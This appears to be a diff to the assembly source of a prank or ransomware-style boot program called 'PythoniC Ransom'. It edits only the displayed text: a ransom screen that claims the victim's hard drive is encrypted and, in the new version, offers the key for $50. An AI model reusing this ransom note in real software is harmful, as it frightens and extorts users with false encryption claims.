@@ -71,9 +71,9 @@ endPrinting:                   ; <= Function 'endPrinting'
 firstString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
 secondString: db '        --/\/\/\/\/\/\>>>     You Have Been Infected By The PythoniC Ransom',  0xA, 0xD, 0          ; <= Text for show
 thirdString: db '================================================================================', 0xA, 0xD, 0  ; <= Text for show
-descriptionString: db ' Your hard drive had been encrypted LOL...', 0xA, 0xD,' There is no escape with out a decryption key', 0xA, 0xD,' YOU CAN NOT BY THIS KEY!!! You will have to find it!', 0xA, 0xD, ' Trust me, its realy easy to get your key... ', 0xA, 0xD, ' ', 0xA, 0xD, '   1. Go on to your phone, It so easy!', 0xA, 0xD, '   2. On Google look up "https://github.com/CPScript/key"', 0xA, 0xD, '   3. Find the KEY on that page... then type it below!', 0xA, 0xD, ' ', 0xA, 0xD, ' HAVE FUN!!!   :)', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; <= Text for show
-fourghtString: db ' Enter the decryption key: ', 0                                                               ; <= Text for show
-invalidKey: db '  => Error! Invalid key value', 0xA, 0xD, 0                                                      ; <= Error text for show
+descriptionString: db ' Your hard drive had been encrypted LOL...', 0xA, 0xD,' There is no escape with out a decryption key', 0xA, 0xD,' BUT... this key doesnt exist!', 0xA, 0xD, ' LOL! ', 0xA, 0xD, ' ', 0xA, 0xD, ' Discription:', 0xA, 0xD, '---------------------------------------------', 0xA, 0xD, 'PythoniC is a ransom that isn't rly a ransom... now there is a key, but your not gonna find it! As long as you can find the clue to get the key, you can buy it for 50$' ', 0xA, 0xD, ' HAVE FUN!!!   :)', 0xA, 0xD, ' ', 0xA, 0xD, 0 ; <= Text for show
+fourghtString: db ' Enter key: ', 0                                                               ; <= Text for show
+invalidKey: db '  => Invalid key ', 0xA, 0xD, 0                                                      ; <= Error text for show
 inputString: db ' ', 0                                                                                           ; <= Bug-fix text
 
 times 1024-($-$$) db 0                                                                                           ; <= Add null-bytes in free space 
